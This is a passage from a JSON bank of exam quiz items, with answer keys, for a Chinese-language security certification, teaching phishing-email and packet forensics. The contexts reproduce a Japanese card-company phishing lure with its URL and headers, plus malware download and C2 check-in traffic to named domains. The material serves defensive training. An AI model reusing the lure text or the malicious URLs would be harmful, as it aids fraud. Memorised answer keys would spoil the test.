d)(IPF:2,PASS)(FROMBW:2,PASS)(FROMBW:2,PASS)(autowhite:NO_ACTION,2)\nX-MAILCLOUD-ANTISPAM-RESULT: Yes/1040\nReceived: from 165.154.234.197\n    by mta.（遮蔽）.com.tw with MailAudit ESMTP Server V5.0(9500:0:AUTH_NONE)\n    (envelope-from <vpass_Net.Ab1victimA1@accounts（遮蔽）.com>); Sat, 04 Jan 2025 07:08:51 +0800 (CST)\nReceived: from localhost (localhost [IPv6:::1])\n    by 10-52-169-76.localdomain (Postfix) with ESMTP id EC8105461991\n    for <victim@（遮蔽）.com.tw>; Fri,  3 Jan 2025 14:06:15 +0100 (WAT)\nMime-Version: 1.0\nList-Unsubscribe-Post: List-Unsubscribe=One-Click\nErrors-To: 9a38f1f8-6c115ef175b8@1d81dc8198.com\nDate: Fri, 03 Jan 2025 22:06:15 +0900\nTo: victim@（遮蔽）.com.tw\nSubject: =?UTF-8?q?=E3=80=8C=E5=8F=A3=E5=BA=A7=E5=8F=96=E5=BC=95=E5=88=B6=E9=99=90?=\nX-Originating-IP: [91.222.43.64]\nMessage-ID: <2025010384617949372959@de617.repica.jp>\nList-Unsubscribe: <mailto:32dfce0c62dfa07f0728@6c115ef175b8?subject=unsubscribe>\nMIME-Version: 1.0\nFrom: =?UTF-8?q?=E4=B8=89=E4=BA=95=E4=BD=8F=E5=8F=8B=E3=82=AB=E3=83=BC=E3=83=89?=\n <vpass_Net.Ab1victimA1@accounts（遮蔽）.com>\nContent-Type: multipart/alternative;\n boundary=399347129b2f13253edb8d3834c632ecce94a05d85bfda56f03bc3b744ab\nX-DCC-Body-Count: 1\nX-DCC-Fuz1-Count: 1\nX-DCC-Fuz2-Count: 1000000\nX-DCC--Metrics: spamfilter2.（遮蔽）.com.tw 1325; Body=1 Fuz1=1 Fuz2=many",
     "hint": "回想 DKIM 的作用與 No signature 代表的意義，逐項判斷每個行動是否適切。",
     "explanation": "答案 B。DKIM 顯示 No signature 代表郵件來源無法被簽章驗證，是警訊但不等於一定惡意，合理的做法是驗證信件來源並檢查是否有其他可疑跡象（如 SPF softfail、網域與內容、連結）。A 自動信任，錯；C 因沒有簽章就說一定惡意而立即刪除，過度推論也不利調查；D 啟用防火牆阻擋所有與該網域相關的通信，過於粗暴，也沒有先查證。",
     "source": "115-1 第6題"
    },
    {
     "stem": "情境如附圖所示。如果通過VirusTotal 等工具，發現網址被標記為惡意，身為專業資安人員應該採取下列何項處置最為適切？",
     "options": [
      "立即在公司網路中封鎖該網址，並通知相關人員不要點擊",
      "忽略不用理會判定結果，因為誤判的可能性很高",
      "在自己工作電腦直接點擊網址，自己感受確認是否真的有安全威脅",
      "將此網址加入瀏覽器白名單以避免誤報"
     ],
     "answer": 0,
     "context": "網路詐騙十分猖獗，公司一位高階主管，被一封釣魚信件欺騙（圖一），點擊信件中的連結，並且連結 C2 中繼站，植入惡意程式，竊取該位主管瀏覽器的帳號與密碼，其中包含了連接公司 Exchange 帳號與密碼…趕緊尋求公司資安部門進行鑑識分析，結果從信件標頭及詳細資訊發現到以下資訊（圖二），身為資安事件威脅攻擊之鑑識人員你（妳），請依據這兩項鑑識資訊，回答本題組之相關問題。\n\n圖一（釣魚信件畫面）\n來源：三井住友カード株式会社 <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>\n收信：victim@（遮蔽）.com.tw\n標題：「口座取引制限のお知らせ：Vpass情報の更新が必要です●QB-51454758593\nSUMITOMO MITSUI BANKING CORPORATION\n（圖片文字）回答が完了しますと通常どおりログイン後のお手続きが可能になります\n［Vpass情報を更新する］ https://move-smbc-co.sbs/vpass\n※一定期間ご確認いただけない場合、口座取引を制限させていただきます。\n■発行者 三井住友カード株式会社 〒135-0061 東京都江東区豊洲2丁目2番31号 SMBC豊洲ビル\nお問い合わせはこちら ※本メールの返信用アドレスは配信専用です。\n三井住友カードレターの登録内容変更・解除はこちら\n※お手続きには、Vpassへのログインが必要です。\n※変更・解除の反映までに1、2週間ほど時間がかかる場合があります。\nCopyright (C) Sumitomo Mitsui Card Co., Ltd. All rights reserved.\n\n圖二（郵件標頭）\nX-M2K-MATCHED-RULE: SPAM_FILTER-SPAM\nX-M2K-MATCHED-RESULT: Quarantine by Level: High\nX-TRACE-MSG-ID: S_67786E06000DD1362A23EC8E0000E016000165B4\nReceived: from 10.0.1.7\n    by gsv2.（遮蔽）.com.tw with （遮蔽） ESMTP Server V7.00(57366:0:AUTH_NONE)\n    (envelope-from <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>); Sat, 04 Jan 2025 07:08:54 +0800 (CST)\nReturn-Path: <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>\nX-M2K-MSG-ID: 67786E062D1628BC\nReceived: from 10.0.1.7\n    by mx2.（遮蔽）.com.tw with （遮蔽） ESMTP Server V4.00M(1185:0:AUTH_NONE)\n    (envelope-from <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>); Sat, 04 Jan 2025 07:08:52 +0800 (CST)\nReturn-Path: <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>\nX-M2KPolicyIP: 10.0.1.7 (#NOT FOUND)\nReceived: from spamfilter2.（遮蔽）.com.tw (localhost [127.0.0.1])\n    by spamfilter2.（遮蔽）.com.tw (Postfix) with ESMTP id 967BB540AB3\n    for <victim@（遮蔽）.com.tw>; Sat,  4 Jan 2025 07:08:52 +0800 (CST)\nReceived: from l4.（遮蔽）.com.tw (mta.（遮蔽）.com.tw [10.0.0.4])\n    by spamfilter2.（遮蔽）.com.tw (Postfix) with ESMTP\n    for <victim@（遮蔽）.com.tw>; Sat,  4 Jan 2025 07:08:52 +0800 (CST)\nX-M2K-DINF: v=1;em=2;eh=1c343546/6OAINL;ec=e0c3cc29;m=ReK/s4+0ysZmw+oyf38QGbht\n    7IEuc1wrc0XaFOfDl4piRhskETTeW1b7vtteCRn3kdyegyr9DHClgD137iBm9v17WJWvfiu69dw1\nX-MG-ANTISPAM-RESULT: Yes/1040\nX-MailGates: (RBL:1,SPAM,165.154.234.197#sbl-xbl.spamhaus.org|bl.spamcop\n    .net:6.666667e-01)(SPF:1,SPAM,softfail)(BATV:2,PASS,sender not empty)(DK\n    :2,PASS,no signature)(DKIM:2,PASS,No signature(2))(GL:2,PASS,Valid recor\n    d)(IPF:2,PASS)(FROMBW:2,PASS)(FROMBW:2,PASS)(autowhite:NO_ACTION,2)\nX-MAILCLOUD-ANTISPAM-RESULT: Yes/1040\nReceived: from 165.154.234.197\n    by mta.（遮蔽）.com.tw with MailAudit ESMTP Server V5.0(9500:0:AUTH_NONE)\n    (envelope-from <vpass_Net.Ab1victimA1@accounts（遮蔽）.com>); Sat, 04 Jan 2025 07:08:51 +0800 (CST)\nReceived: from localhost (localhost [IPv6:::1])\n    by 10-52-169-76.localdomain (Postfix) with ESMTP id EC8105461991\n    for <victim@（遮蔽）.com.tw>; Fri,  3 Jan 2025 14:06:15 +0100 (WAT)\nMime-Version: 1.0\nList-Unsubscribe-Post: List-Unsubscribe=One-Click\nErrors-To: 9a38f1f8-6c115ef175b8@1d81dc8198.com\nDate: Fri, 03 Jan 2025 22:06:15 +0900\nTo: victim@（遮蔽）.com.tw\nSubject: =?UTF-8?q?=E3=80=8C=E5=8F=A3=E5=BA=A7=E5=8F=96=E5=BC=95=E5=88=B6=E9=99=90?=\nX-Originating-IP: [91.222.43.64]\nMessage-ID: <2025010384617949372959@de617.repica.jp>\nList-Unsubscribe: <mailto:32dfce0c62dfa07f0728@6c115ef175b8?subject=unsubscribe>\nMIME-Version: 1.0\nFrom: =?UTF-8?q?=E4=B8=89=E4=BA=95=E4=BD=8F=E5=8F=8B=E3=82=AB=E3=83=BC=E3=83=89?=\n <vpass_Net.Ab1victimA1@accounts（遮蔽）.com>\nContent-Type: multipart/alternative;\n boundary=399347129b2f13253edb8d3834c632ecce94a05d85bfda56f03bc3b744ab\nX-DCC-Body-Count: 1\nX-DCC-Fuz1-Count: 1\nX-DCC-Fuz2-Count: 1000000\nX-DCC--Metrics: spamfilter2.（遮蔽）.com.tw 1325; Body=1 Fuz1=1 Fuz2=many",
     "hint": "回想資安人員處理可疑網址的原則，逐項判斷每個處置是否適切。",
     "explanation": "答案 A。網址已被 VirusTotal 等工具標記為惡意，專業做法是在公司網路立即封鎖並通知相關人員不要點擊，同時進行後續清查。B 忽略判定結果不合理；C 在自己的工作電腦直接點擊，會讓自己成為受害者；D 把惡意網址加入瀏覽器白名單，等於放行威脅。",
     "source": "115-1 第7題"
    },
    {
     "stem": "情境如附圖所示。在驗證網址的安全性時，可以採取下列哪些具安全性的方式進行檢查？",
     "options": [
      "使用DNS 查詢工具檢查域名的註冊日期和註冊商資訊",
      "點擊連結後檢查網站的內容是否與官方網站一致",
      "使用URL 檢測工具（如VirusTotal）進行分析",
      "根據網址中的頂級域名（如.sbs）直接判定為安全或危險"
     ],
     "answer": [
      0,
      2
     ],
     "context": "網路詐騙十分猖獗，公司一位高階主管，被一封釣魚信件欺騙（圖一），點擊信件中的連結，並且連結 C2 中繼站，植入惡意程式，竊取該位主管瀏覽器的帳號與密碼，其中包含了連接公司 Exchange 帳號與密碼…趕緊尋求公司資安部門進行鑑識分析，結果從信件標頭及詳細資訊發現到以下資訊（圖二），身為資安事件威脅攻擊之鑑識人員你（妳），請依據這兩項鑑識資訊，回答本題組之相關問題。\n\n圖一（釣魚信件畫面）\n來源：三井住友カード株式会社 <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>\n收信：victim@（遮蔽）.com.tw\n標題：「口座取引制限のお知らせ：Vpass情報の更新が必要です●QB-51454758593\nSUMITOMO MITSUI BANKING CORPORATION\n（圖片文字）回答が完了しますと通常どおりログイン後のお手続きが可能になります\n［Vpass情報を更新する］ https://move-smbc-co.sbs/vpass\n※一定期間ご確認いただけない場合、口座取引を制限させていただきます。\n■発行者 三井住友カード株式会社 〒135-0061 東京都江東区豊洲2丁目2番31号 SMBC豊洲ビル\nお問い合わせはこちら ※本メールの返信用アドレスは配信専用です。\n三井住友カードレターの登録内容変更・解除はこちら\n※お手続きには、Vpassへのログインが必要です。\n※変更・解除の反映までに1、2週間ほど時間がかかる場合があります。\nCopyright (C) Sumitomo Mitsui Card Co., Ltd. All rights reserved.\n\n圖二（郵件標頭）\nX-M2K-MATCHED-RULE: SPAM_FILTER-SPAM\nX-M2K-MATCHED-RESULT: Quarantine by Level: High\nX-TRACE-MSG-ID: S_67786E06000DD1362A23EC8E0000E016000165B4\nReceived: from 10.0.1.7\n    by gsv2.（遮蔽）.com.tw with （遮蔽） ESMTP Server V7.00(57366:0:AUTH_NONE)\n    (envelope-from <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>); Sat, 04 Jan 2025 07:08:54 +0800 (CST)\nReturn-Path: <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>\nX-M2K-MSG-ID: 67786E062D1628BC\nReceived: from 10.0.1.7\n    by mx2.（遮蔽）.com.tw with （遮蔽） ESMTP Server V4.00M(1185:0:AUTH_NONE)\n    (envelope-from <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>); Sat, 04 Jan 2025 07:08:52 +0800 (CST)\nReturn-Path: <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>\nX-M2KPolicyIP: 10.0.1.7 (#NOT FOUND)\nReceived: from spamfilter2.（遮蔽）.com.tw (localhost [127.0.0.1])\n    by spamfilter2.（遮蔽）.com.tw (Postfix) with ESMTP id 967BB540AB3\n    for <victim@（遮蔽）.com.tw>; Sat,  4 Jan 2025 07:08:52 +0800 (CST)\nReceived: from l4.（遮蔽）.com.tw (mta.（遮蔽）.com.tw [10.0.0.4])\n    by spamfilter2.（遮蔽）.com.tw (Postfix) with ESMTP\n    for <victim@（遮蔽）.com.tw>; Sat,  4 Jan 2025 07:08:52 +0800 (CST)\nX-M2K-DINF: v=1;em=2;eh=1c343546/6OAINL;ec=e0c3cc29;m=ReK/s4+0ysZmw+oyf38QGbht\n    7IEuc1wrc0XaFOfDl4piRhskETTeW1b7vtteCRn3kdyegyr9DHClgD137iBm9v17WJWvfiu69dw1\nX-MG-ANTISPAM-RESULT: Yes/1040\nX-MailGates: (RBL:1,SPAM,165.154.234.197#sbl-xbl.spamhaus.org|bl.spamcop\n    .net:6.666667e-01)(SPF:1,SPAM,softfail)(BATV:2,PASS,sender not empty)(DK\n    :2,PASS,no signature)(DKIM:2,PASS,No signature(2))(GL:2,PASS,Valid recor\n    d)(IPF:2,PASS)(FROMBW:2,PASS)(FROMBW:2,PASS)(autowhite:NO_ACTION,2)\nX-MAILCLOUD-ANTISPAM-RESULT: Yes/1040\nReceived: from 165.154.234.197\n    by mta.（遮蔽）.com.tw with MailAudit ESMTP Server V5.0(9500:0:AUTH_NONE)\n    (envelope-from <vpass_Net.Ab1victimA1@accounts（遮蔽）.com>); Sat, 04 Jan 2025 07:08:51 +0800 (CST)\nReceived: from localhost (localhost [IPv6:::1])\n    by 10-52-169-76.localdomain (Postfix) with ESMTP id EC8105461991\n    for <victim@（遮蔽）.com.tw>; Fri,  3 Jan 2025 14:06:15 +0100 (WAT)\nMime-Version: 1.0\nList-Unsubscribe-Post: List-Unsubscribe=One-Click\nErrors-To: 9a38f1f8-6c115ef175b8@1d81dc8198.com\nDate: Fri, 03 Jan 2025 22:06:15 +0900\nTo: victim@（遮蔽）.com.tw\nSubject: =?UTF-8?q?=E3=80=8C=E5=8F=A3=E5=BA=A7=E5=8F=96=E5=BC=95=E5=88=B6=E9=99=90?=\nX-Originating-IP: [91.222.43.64]\nMessage-ID: <2025010384617949372959@de617.repica.jp>\nList-Unsubscribe: <mailto:32dfce0c62dfa07f0728@6c115ef175b8?subject=unsubscribe>\nMIME-Version: 1.0\nFrom: =?UTF-8?q?=E4=B8=89=E4=BA=95=E4=BD=8F=E5=8F=8B=E3=82=AB=E3=83=BC=E3=83=89?=\n <vpass_Net.Ab1victimA1@accounts（遮蔽）.com>\nContent-Type: multipart/alternative;\n boundary=399347129b2f13253edb8d3834c632ecce94a05d85bfda56f03bc3b744ab\nX-DCC-Body-Count: 1\nX-DCC-Fuz1-Count: 1\nX-DCC-Fuz2-Count: 1000000\nX-DCC--Metrics: spamfilter2.（遮蔽）.com.tw 1325; Body=1 Fuz1=1 Fuz2=many",
     "hint": "逐項問：這個方法本身安不安全？得出的判斷是否可靠？",
     "explanation": "答案 A、C。A 用 DNS／WHOIS 查詢工具檢查網域註冊日期與註冊商，新註冊的網域常是釣魚特徵；C 使用 VirusTotal 等 URL 檢測工具，不必接觸網站即可分析。B 點擊連結後比對內容，等於直接接觸可能含惡意程式的網站，不安全；D 依頂級網域（如 .sbs）直接判定安全或危險，缺乏依據，也有誤判風險。",
     "source": "115-1 第8題"
    }
   ]
  },
  {
   "id": "2.1-08",
   "section": "2.1",
   "title": "封包分析與流量鑑識",
   "examHits": 4,
   "examRefs": [
    "110-1 第29題",
    "110-1 第30題",
    "110-1 第31題",
    "110-1 第32題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "封包鑑識是用 Wireshark 這類工具讀封包側錄檔，從中找出感染來源與下載內容。實務步驟：用工具錄封包（Wireshark）→ 用顯示過濾器縮小範圍（如 udp.port == 53 看 DNS、tcp.port == 80 看 HTTP、ip.addr == x.x.x.x 看某主機）→ 從 DNS 解析結果對應惡意網域的 IP → 從 HTTP 請求（如 GET /q.jar）與匯出物件清單找出下載的可疑檔案（.jar、可執行檔、疑似回報的 gate.php 等）。判斷時注意：受害者的內網 IP（如 192.168.23.129）不是中繼站；下載惡意程式的是客戶端向中繼站發出的 GET；favicon.ico 這類小檔通常是網站圖示，不是主要惡意載荷；gate.php 這類帶 guid 與 stat=ONLINE 參數的請求是回報上線狀態的 C2 溝通，不是下載。",
   "keyPoints": [
    "錄封包用 Wireshark（或 tcpdump）；ipconfig 是查本機網路設定，不是封包側錄工具。",
    "看到 DNS 查詢與回應畫面 → 過濾條件是 udp.port == 53（DNS 預設 UDP 53）；HTTP 流量是 tcp.port == 80。",
    "找惡意中繼站與下載檔：看 DNS 解析（網域 → IP）與 HTTP GET 的檔名與 Content-Type（如 application/x-java-archive 的 .jar）。",
    "受害者連到的惡意站台 IP 要從 DNS 回應與 HTTP 目的 IP 對應；來源（Source）為內網 IP 的是受害主機，不是中繼站。",
    "gate.php?guid=…&stat=ONLINE 這類是回報上線，不是下載惡意檔；favicon.ico 為一般小圖示，不是主要載荷。"
   ],
   "trap": "把受害者自己的 IP 當成惡意站台、把任何 .php／.ico 都當成惡意檔，或看到 HTTPS 連線（443）就把它當成下載惡意程式的主要來源。",
   "quiz": [
    {
     "stem": "題組背景描述如附圖。若小明想使用常見的封包側錄工具來錄製封包，可以使用下列何種工具做封包錄製？",
     "options": [
      "jpgdump",
      "wireshark",
      "ipconfig",
      "atpx"
     ],
     "answer": 1,
     "context": "（題組 3）\n小明是公司的資安工程師，早上有同仁通知電腦似乎發生異常，防毒軟體好像也失效，因此小明調閱了公司在網路出口的封包側錄檔案，如下圖，請就上述情境回答下列問題。\n\nSource          Destination     Protocol Length Info\n59.53.91.102    192.168.23.129  TCP   60   [TCP Port numbers reused] 80 → 1065 [SYN, ACK] Seq=1 Ack=1 Win=642…\n192.168.23.129  59.53.91.102    TCP   60   1065 → 80 [ACK] Seq=1 Ack=2 Win=64240 Len=0\n59.53.91.102    192.168.23.129  TCP   60   [TCP Port numbers reused] 80 → 1064 [SYN, ACK] Seq=1 Ack=1 Win=642…\n192.168.23.129  59.53.91.102    TCP   60   1064 → 80 [ACK] Seq=1 Ack=2 Win=64240 Len=0\n192.168.23.129  59.53.91.102    HTTP  314  GET /q.jar HTTP/1.1\n59.53.91.102    192.168.23.129  TCP   60   80 → 1065 [ACK] Seq=2 Ack=261 Win=64240 Len=0\n192.168.23.129  59.53.91.102    HTTP  317  GET /sdfg.jar HTTP/1.1\n59.53.91.102    192.168.23.129  TCP   60   80 → 1064 [ACK] Seq=2 Ack=264 Win=64240 Len=0\n192.168.23.129  192.168.23.2    NBNS  110  Refresh NB TICKLAB<00>\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1065 [ACK] Seq=2 Ack=261 Win=64240 Len=1460 [TCP segment of a…\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1065 [PSH, ACK] Seq=1462 Ack=261 Win=64240 Len=1460 [TCP segm…\n192.168.23.129  59.53.91.102    TCP   60   1065 → 80 [ACK] Seq=261 Ack=2922 Win=64240 Len=0\n192.168.23.129  192.168.23.2    NBNS  110  Refresh NB TICKLAB<00>\n192.168.23.129  192.168.23.2    NBNS  110  Refresh NB TICKLAB<00>\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1064 [ACK] Seq=2 Ack=264 Win=64240 Len=1460 [TCP segment of a…\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1064 [PSH, ACK] Seq=1462 Ack=264 Win=64240 Len=1460 [TCP segm…\n192.168.23.129  59.53.91.102    TCP   60   1064 → 80 [ACK] Seq=264 Ack=2922 Win=64240 Len=0\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1064 [ACK] Seq=2922 Ack=264 Win=64240 Len=1460 [TCP segment o…",
     "hint": "逐項回想每個工具的用途。",
     "explanation": "答案 B。Wireshark 是常見的封包側錄與分析工具。A jpgdump 不是常見的封包側錄工具；C ipconfig 用於查詢本機 IP 組態；D atpx 並非封包側錄工具。",
     "source": "110-1 第29題"
    },
    {
     "stem": "題組背景描述如附圖。請問附圖是小明下了什麼指令？",
     "options": [
      "udp.port == 53",
      "tcp.port eq 80",
      "ip.addr==192.168.23.9",
      "arp eq DNS"
     ],
     "answer": 0,
     "context": "（題組 3）\n小明是公司的資安工程師，早上有同仁通知電腦似乎發生異常，防毒軟體好像也失效，因此小明調閱了公司在網路出口的封包側錄檔案，如下圖，請就上述情境回答下列問題。\n\nSource          Destination     Protocol Length Info\n59.53.91.102    192.168.23.129  TCP   60   [TCP Port numbers reused] 80 → 1065 [SYN, ACK] Seq=1 Ack=1 Win=642…\n192.168.23.129  59.53.91.102    TCP   60   1065 → 80 [ACK] Seq=1 Ack=2 Win=64240 Len=0\n59.53.91.102    192.168.23.129  TCP   60   [TCP Port numbers reused] 80 → 1064 [SYN, ACK] Seq=1 Ack=1 Win=642…\n192.168.23.129  59.53.91.102    TCP   60   1064 → 80 [ACK] Seq=1 Ack=2 Win=64240 Len=0\n192.168.23.129  59.53.91.102    HTTP  314  GET /q.jar HTTP/1.1\n59.53.91.102    192.168.23.129  TCP   60   80 → 1065 [ACK] Seq=2 Ack=261 Win=64240 Len=0\n192.168.23.129  59.53.91.102    HTTP  317  GET /sdfg.jar HTTP/1.1\n59.53.91.102    192.168.23.129  TCP   60   80 → 1064 [ACK] Seq=2 Ack=264 Win=64240 Len=0\n192.168.23.129  192.168.23.2    NBNS  110  Refresh NB TICKLAB<00>\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1065 [ACK] Seq=2 Ack=261 Win=64240 Len=1460 [TCP segment of a…\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1065 [PSH, ACK] Seq=1462 Ack=261 Win=64240 Len=1460 [TCP segm…\n192.168.23.129  59.53.91.102    TCP   60   1065 → 80 [ACK] Seq=261 Ack=2922 Win=64240 Len=0\n192.168.23.129  192.168.23.2    NBNS  110  Refresh NB TICKLAB<00>\n192.168.23.129  192.168.23.2    NBNS  110  Refresh NB TICKLAB<00>\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1064 [ACK] Seq=2 Ack=264 Win=64240 Len=1460 [TCP segment of a…\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1064 [PSH, ACK] Seq=1462 Ack=264 Win=64240 Len=1460 [TCP segm…\n192.168.23.129  59.53.91.102    TCP   60   1064 → 80 [ACK] Seq=264 Ack=2922 Win=64240 Len=0\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1064 [ACK] Seq=2922 Ack=264 Win=64240 Len=1460 [TCP segment o…\n（附圖，DNS 封包）\nSource          Destination     Protocol Length Info\n192.168.23.129  192.168.23.2    DNS   68   Standard query 0xfa1c A nrtjo.eu\n192.168.23.129  192.168.23.2    DNS   68   Standard query 0xfa1c A nrtjo.eu\n192.168.23.129  192.168.23.2    DNS   68   Standard query 0xfa1c A nrtjo.eu\n192.168.23.2    192.168.23.129  DNS   162  Standard query response 0xfa1c A nrtjo.eu A 59.53.91.102 NS ns2.vnmhab.com…\n192.168.23.2    192.168.23.129  DNS   162  Standard query response 0xfa1c A nrtjo.eu A 59.53.91.102 NS ns1.vnmhab.com…\n192.168.23.2    192.168.23.129  DNS   162  Standard query response 0xfa1c A nrtjo.eu A 59.53.91.102 NS ns1.vnmhab.com…\n192.168.23.129  192.168.23.2    DNS   68   Standard query 0x5b1d A nrtjo.eu\n192.168.23.2    192.168.23.129  DNS   162  Standard query response 0x5b1d A nrtjo.eu A 59.53.91.102 NS ns1.vnmhab.com…\n192.168.23.129  192.168.23.2    DNS   85   Standard query 0xe78a PTR 102.91.53.59.in-addr.arpa\n192.168.23.2    192.168.23.129  DNS   143  Standard query response 0xe78a No such name PTR 102.91.53.59.in-addr.arpa\n192.168.23.129  192.168.23.2    DNS   71   Standard query 0xbca3 A freeways.in\n192.168.23.2    192.168.23.129  DNS   235  Standard query response 0xbca3 A freeways.in A 212.252.32.20 NS ns3.everyd…",
     "hint": "看附圖的 Protocol 欄與 Info 欄：封包全屬哪一種協定？再想這種協定預設使用的傳輸層與連接埠。",
     "explanation": "答案 A。附圖顯示的全是 DNS 查詢與回應（Standard query／response），對應的過濾條件是 udp.port == 53。B tcp.port eq 80 會顯示 HTTP 流量；C ip.addr==192.168.23.9 圖中並沒有該位址的封包（內網主機為 192.168.23.129）；D arp eq DNS 不是有效的 Wireshark 過濾語法。",
     "source": "110-1 第30題"
    },
    {
     "stem": "題組背景描述如附圖。小明從附圖中可找出封包中何者是惡意網站，造成同仁連上後下載了惡意程式，請問同仁電腦連上什麼中繼站，以及下載了什麼可疑的惡意檔案？",
     "options": [
      "nrtjo.eu 下載sdfg.jar",
      "nrtjo.eu 下載q.jar",
      "nrtjo.eu 下載favicon.ico",
      "freeways.in 下載 gates.php"
     ],
     "answer": [
      0,
      1
     ],
     "context": "（題組 3）\n小明是公司的資安工程師，早上有同仁通知電腦似乎發生異常，防毒軟體好像也失效，因此小明調閱了公司在網路出口的封包側錄檔案，如下圖，請就上述情境回答下列問題。\n\nSource          Destination     Protocol Length Info\n59.53.91.102    192.168.23.129  TCP   60   [TCP Port numbers reused] 80 → 1065 [SYN, ACK] Seq=1 Ack=1 Win=642…\n192.168.23.129  59.53.91.102    TCP   60   1065 → 80 [ACK] Seq=1 Ack=2 Win=64240 Len=0\n59.53.91.102    192.168.23.129  TCP   60   [TCP Port numbers reused] 80 → 1064 [SYN, ACK] Seq=1 Ack=1 Win=642…\n192.168.23.129  59.53.91.102    TCP   60   1064 → 80 [ACK] Seq=1 Ack=2 Win=64240 Len=0\n192.168.23.129  59.53.91.102    HTTP  314  GET /q.jar HTTP/1.1\n59.53.91.102    192.168.23.129  TCP   60   80 → 1065 [ACK] Seq=2 Ack=261 Win=64240 Len=0\n192.168.23.129  59.53.91.102    HTTP  317  GET /sdfg.jar HTTP/1.1\n59.53.91.102    192.168.23.129  TCP   60   80 → 1064 [ACK] Seq=2 Ack=264 Win=64240 Len=0\n192.168.23.129  192.168.23.2    NBNS  110  Refresh NB TICKLAB<00>\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1065 [ACK] Seq=2 Ack=261 Win=64240 Len=1460 [TCP segment of a…\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1065 [PSH, ACK] Seq=1462 Ack=261 Win=64240 Len=1460 [TCP segm…\n192.168.23.129  59.53.91.102    TCP   60   1065 → 80 [ACK] Seq=261 Ack=2922 Win=64240 Len=0\n192.168.23.129  192.168.23.2    NBNS  110  Refresh NB TICKLAB<00>\n192.168.23.129  192.168.23.2    NBNS  110  Refresh NB TICKLAB<00>\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1064 [ACK] Seq=2 Ack=264 Win=64240 Len=1460 [TCP segment of a…\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1064 [PSH, ACK] Seq=1462 Ack=264 Win=64240 Len=1460 [TCP segm…\n192.168.23.129  59.53.91.102    TCP   60   1064 → 80 [ACK] Seq=264 Ack=2922 Win=64240 Len=0\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1064 [ACK] Seq=2922 Ack=264 Win=64240 Len=1460 [TCP segment o…\n（附圖，DNS 封包）\nSource          Destination     Protocol Length Info\n192.168.23.129  192.168.23.2    DNS   68   Standard query 0xfa1c A nrtjo.eu\n192.168.23.129  192.168.23.2    DNS   68   Standard query 0xfa1c A nrtjo.eu\n192.168.23.129  192.168.23.2    DNS   68   Standard query 0xfa1c A nrtjo.eu\n192.168.23.2    192.168.23.129  DNS   162  Standard query response 0xfa1c A nrtjo.eu A 59.53.91.102 NS ns2.vnmhab.com…\n192.168.23.2    192.168.23.129  DNS   162  Standard query response 0xfa1c A nrtjo.eu A 59.53.91.102 NS ns1.vnmhab.com…\n192.168.23.2    192.168.23.129  DNS   162  Standard query response 0xfa1c A nrtjo.eu A 59.53.91.102 NS ns1.vnmhab.com…\n192.168.23.129  192.168.23.2    DNS   68   Standard query 0x5b1d A nrtjo.eu\n192.168.23.2    192.168.23.129  DNS   162  Standard query response 0x5b1d A nrtjo.eu A 59.53.91.102 NS ns1.vnmhab.com…\n192.168.23.129  192.168.23.2    DNS   85   Standard query 0xe78a PTR 102.91.53.59.in-addr.arpa\n192.168.23.2    192.168.23.129  DNS   143  Standard query response 0xe78a No such name PTR 102.91.53.59.in-addr.arpa\n192.168.23.129  192.168.23.2    DNS   71   Standard query 0xbca3 A freeways.in\n192.168.23.2    192.168.23.129  DNS   235  Standard query response 0xbca3 A freeways.in A 212.252.32.20 NS ns3.everyd…\n（附圖，物件清單）\nPacket  Hostname     Content Type                  Size      Filename\n13      nrtjo.eu     text/html                     6278 bytes  true.php\n32      nrtjo.eu     text/plain                    171 bytes   xxx.xxx\n55      nrtjo.eu     text/html                     409 bytes   favicon.ico\n85      nrtjo.eu     application/x-java-archive    7079 bytes  sdfg.jar\n98      nrtjo.eu     application/x-java-archive    5573 bytes  q.jar\n217     nrtjo.eu     application/octet-stream      68 kB       loading.php?spl=javad0\n273     nrtjo.eu     application/octet-stream      68 kB       loading.php?spl=javadnw&J050006010\n295     freeways.in  text/html                     672 bytes   gate.php?guid=ADMINISTRATOR!TICKLABS-LZ!1C7AE7C1&ver=10084&stat=ONLINE&ie=8.0.6001.18702&os=5.1.2600&ut=Admin&cpu=92&cc…",
     "hint": "對照附圖物件清單的主機、檔名、類型與大小，逐項判斷哪些是中繼站與可疑惡意檔案。",
     "explanation": "答案 A、B。從 HTTP 請求與物件清單可見，受害主機向網域 nrtjo.eu（解析為 59.53.91.102）下載了 sdfg.jar 與 q.jar（Content-Type 為 application/x-java-archive），這兩個 Java 封裝檔即為可疑惡意檔案。C favicon.ico 是 409 bytes 的 text/html 小檔，一般是網站圖示請求，不是主要惡意載荷；D freeways.in 的 gate.php?guid=…&stat=ONLINE 是回報主機上線狀態的請求，不是下載惡意檔案。",
     "source": "110-1 第31題"
    },
    {
     "stem": "題組背景描述如附圖。小明在附圖封包中可以判斷出受害者連線下載惡意程式的網站 IP 位置為下列何者？",
     "options": [
      "59.53.91.102",
      "192.168.23.129",
      "65.55.195.250",
      "127.0.0.1"
     ],
     "answer": 0,
